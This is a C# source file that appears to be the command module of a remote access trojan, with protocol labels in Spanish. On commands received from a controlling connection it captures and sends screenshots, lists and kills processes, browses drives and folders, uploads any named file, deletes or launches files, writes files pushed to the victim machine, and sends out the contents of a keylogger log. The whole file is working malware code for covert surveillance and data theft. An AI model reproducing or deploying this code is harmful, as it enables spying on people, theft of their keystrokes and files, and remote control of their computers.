namespace Core.Command
{
    using System;
    using System.Diagnostics;
    using System.Threading;
    using System.Text.RegularExpressions;
    using System.IO;
    using System.Linq;

    using Core.Screenshot;
    using Core.Connection;

    public class Command
    {
        private readonly Connection _connection;
        private readonly ScreenCapture _screenShot;

        private const int DIRECTORY_INTERVAL = 5;
        private const int TASKS_INTERVAL = 5;
        private const int INTERVAL_SEND_FILE = 1000;

        // In characteres
        private const int MAX_BUFFER_CACHE_LENGTH = 500;

        private static string previousDirectory = string.Empty;
        private string _fileBuffer = string.Empty;

        public Command(Connection connection)
        {
            _connection = connection ?? throw new Exception("Error, Connection class cannot be null");
            _screenShot = new ScreenCapture();
        }

        public void ListDirectory(string directoryPattern)
        {
            if (!(Directory.Exists(directoryPattern) || File.Exists(directoryPattern)))
            {
                return;
            }

            var directoryFiles = Directory.GetFiles(directoryPattern);
            var directoryFolders = Directory.GetDirectories(directoryPattern);

            var singleFolder = string.Empty;
            var singleFile = string.Empty;

            foreach (var folder in directoryFolders)
            {
                singleFolder = folder.Contains("\\") ? folder.Split('\\').LastOrDefault() : singleFolder;

                _connection?.SendData(string.Format(
                    "|listado|{0}|{1}|{2}|{3}|",
                    singleFolder,
                    "Carpeta",
                    folder,
                    "0"));

                Thread.Sleep(DIRECTORY_INTERVAL);
            }

            foreach (var file in directoryFiles)
            {
                singleFile = file.Contains("\\") ? file.Split('\\').LastOrDefault() : file;

                _connection?.SendData(string.Format(
                    "|listado|{0}|{1}|{2}|{3}|",
                    singleFile,
                    "Archivo",
                    file,
                    new FileInfo(file).Length));

                Thread.Sleep(DIRECTORY_INTERVAL);
            }

            previousDirectory = directoryPattern;

            return;
        }

        public void DetectCommand(string commandReceived)
        {
            try
            {
                if (commandReceived.Contains("ssr"))
                {
                    var screenBuffer = _screenShot.FullScreenshot().GetBuffer();
                    var sizeScreen = screenBuffer.Length;

                    _connection?.SendData(string.Format("|archivo|{0}|img.jpg|", sizeScreen));
                    _connection?.SendData(screenBuffer);

                    return;
                }

                if (commandReceived.Contains("lis"))
                {
                    var processlist = Process.GetProcesses();

                    foreach (var theprocess in processlist)
                    {
                        var processString = string.Format(
                            "|proceso|{0}|{1}|{2}|",
                            theprocess.ProcessName,
                            theprocess.MainWindowTitle
                            /*theprocess.MainModule.FileName*/,
                            theprocess.Id);

                        _connection?.SendData(processString);

                        Thread.Sleep(TASKS_INTERVAL);
                    }
                }

                if (commandReceived.StartsWith("tas"))
                {
                    var processName = Regex.Split(commandReceived, "tas")[1];
                    var result = Process.GetProcessesByName(processName);

                    foreach (var process in result)
                    {
                        process.Kill();
                    }

                    return;
                }

                if (commandReceived.Contains("diz"))
                {
                    var directoryName = commandReceived.Contains("\\") ?
                        commandReceived.TrimStart(new char[] { 'd', 'i', 'z' }) : Regex.Split(commandReceived, "diz")[1];

                    if (int.TryParse(directoryName, out int id))
                    {
                        var winDirDirectory = string.Format("{0}\\", Environment.GetEnvironmentVariable("windir"));

                        switch (directoryName)
                        {
                            case "1":
                                ListDirectory(winDirDirectory);
                                break;

                            case "7":
                                var logicalDrivers = DriveInfo.GetDrives();

                                foreach (var drive in logicalDrivers)
                                {
                                    var driveType = string.Empty;

                                    if (!drive.IsReady) continue;

                                    switch (drive.DriveType)
                                    {
                                        case DriveType.CDRom:
                                            driveType = "CD-ROM";
                                            break;

                                        case DriveType.Fixed:
                                            driveType = "Disco duro";
                                            break;

                                        case DriveType.Removable:
                                            driveType = "Disco extraible";
                                            break;

                                        case DriveType.Ram:
                                            driveType = "Ram";
                                            break;

                                        case DriveType.Network:
                                            driveType = "Network";
                                            break;

                                        case DriveType.NoRootDirectory:
                                        case DriveType.Unknown:
                                            driveType = "Unknown";
                                            break;
                                    }

                                    var information = string.Format(
                                        "|listado|{0}|{1}|{2}|{3}|",
                                        drive.RootDirectory,
                                        driveType,
                                        drive.Name,
                                        string.Format("{0}/{1}/{2}", drive.AvailableFreeSpace, drive.TotalFreeSpace, drive.TotalSize));

                                    _connection?.SendData(information);

                                    Thread.Sleep(DIRECTORY_INTERVAL);
                                }

                                break;
                        }
                    }
                    else
                    {
                        ListDirectory(directoryName);
                    }

                    return;
                }

                if (commandReceived.Contains("trx"))
                {
                    var fileName = Regex.Split(commandReceived, "trx")[1];

                    if (!File.Exists(fileName))
                    {
                        _connection?.SendData("Error sending the file specified");
                        return;
                    }

                    // Getting the File Size
                    var fileSize = new FileInfo(fileName).Length;

                    var information = string.Format("|archivo|{0}|{1}|", fileSize, fileName.Split('\\').LastOrDefault());

                    using (var file = new StreamReader(fileName))
                    {
                        var buffer = file.ReadToEnd();

                        _connection?.SendData(information);

                        Thread.Sleep(INTERVAL_SEND_FILE);

                        _connection?.SendData(buffer);
                    }

                    return;
                }

                if (commandReceived.Contains("del"))
                {
                    var path = Regex.Split(commandReceived, "del")[1];

                    // This avoid possible error/exception if we've recived a invalid path to open/delete
                    if (File.Exists(path))
                    {
                        File.Delete(path);
                    }

                    return;
                }

                if (commandReceived.Contains("ope"))
                {
                    var path = Regex.Split(commandReceived, "ope")[1];

                    // This avoid possible error/exception if we've recived a invalid path to open/delete
                    if (File.Exists(path))
                    {
                        var pi = new ProcessStartInfo(path);

                        Process.Start(pi);
                    }

                    return;
                }

                // TODO: Fix it
                if (commandReceived.StartsWith("fil"))
                {
                    var fileInfo = Regex.Split(commandReceived, "fil")[1];
                    var dataExtension = fileInfo.Contains("*")
                        ? fileInfo.Split('*') : default(string[]);

                    // Error in command
                    if (dataExtension == null)
                    {
                        return;
                    }

                    var dataSplitted = dataExtension[1].Contains("+")
                        ? dataExtension[1].Split('+') : default(string[]);

                    // Error in command
                    if (dataSplitted == null)
                    {
                        return;
                    }

                    // TODO: Change it for TryParse and in case of error, return and exit from this function
                    long fileSize = long.Parse(dataSplitted[0]);

                    var extension = dataExtension[0];
                    var filePath = string.Format("{0}.{1}", dataSplitted[1], extension);

                    // TODO: Review this function in order to test that everything works as expected
                    _connection?.ReceiveInformationForPath((fileBuffer) =>
                    {
                        if (File.Exists(filePath))
                        {
                            File.Delete(filePath);
                        }

                        using (var streamWriter = new StreamWriter(filePath))
                        {
                            streamWriter.Write(fileBuffer);
                            streamWriter.Close();
                        }
                    });

                    return;
                }

                if (commandReceived.Contains("keylo"))
                {
                    // Getting the File Size for the keylogger
                    var fileSize = new FileInfo(_connection.LoggerPath).Length;

                    var information = string.Format("|archivo|{0}|{1}|", fileSize, _connection.LoggerPath.Contains("\\") ?
                        _connection.LoggerPath.Split('\\').LastOrDefault() : _connection.LoggerPath);

                    using (var file = new StreamReader(_connection.LoggerPath))
                    {
                        var buffer = file.ReadToEnd();

                        _connection?.SendData(information);

                        Thread.Sleep(INTERVAL_SEND_FILE);

                        _connection?.SendData(buffer);
                    }

                    return;
                }

                _fileBuffer = _fileBuffer.Length < MAX_BUFFER_CACHE_LENGTH ? commandReceived : string.Empty;
            }
            catch (Exception ex)
            {
                if (ex.Message.ToLower().Contains("denied"))
                {
                    _connection.SendData("Access Denied");
                    return;
                }

                throw ex;
            }

            Console.WriteLine(commandReceived);
        }
    }
}
